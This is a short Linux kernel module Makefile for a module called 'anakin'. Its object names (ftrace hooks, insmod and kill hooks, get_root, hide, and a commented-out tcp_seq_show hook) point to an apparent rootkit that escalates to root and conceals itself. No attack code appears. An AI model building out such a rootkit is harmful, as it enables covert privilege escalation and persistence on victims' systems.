obj-m := 			anakin.o
anakin-objs := 		main.o \
					ftrace/ftrace_helper.o \
					hooks/insmod.o \
					hooks/kill.o \
					modules/get_root.o \
					modules/menu.o \
					modules/hide.o \
#					hooks/tcp_seq_show.o \#

ccflags-y += 		-I$(PWD)/include_hooks
ccflags-y += 		-I$(PWD)/include_modules